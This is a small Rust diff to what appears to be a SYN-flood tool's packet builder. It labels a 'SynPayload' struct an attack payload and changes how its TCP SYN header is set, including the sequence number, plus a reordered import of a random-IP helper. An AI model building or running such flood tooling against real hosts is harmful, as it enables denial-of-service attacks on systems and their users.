@@ -3,8 +3,8 @@ use std::net::Ipv4Addr;
 use pnet::packet::{ethernet, ip, ipv4, tcp};
 use pnet::{datalink, util::MacAddr};
 
-use crate::util::get_random_ip;
 use crate::Result;
+use crate::util::get_random_ip;
 
 /// A attack payload for a SYN packet.
 pub struct SynPayload {
@@ -98,14 +98,15 @@ impl super::Payload for SynPayload {
                 &mut packet[(super::PKT_ETH_SIZE + super::PKT_IPV4_SIZE)..],
             )
             .ok_or(crate::error::Error::BufferTooSmall)?;
+
             tcp_header.set_source(self.src_port);
             tcp_header.set_destination(self.dst_port);
 
-            tcp_header.set_sequence(1460);
+            tcp_header.set_flags(tcp::TcpFlags::SYN);
             tcp_header.set_window(64240);
             tcp_header.set_data_offset(8);
             tcp_header.set_urgent_ptr(0);
-            tcp_header.set_flags(tcp::TcpFlags::SYN);
+            tcp_header.set_sequence(0);
 
             tcp_header.set_options(&[
                 tcp::TcpOption::mss(1460),
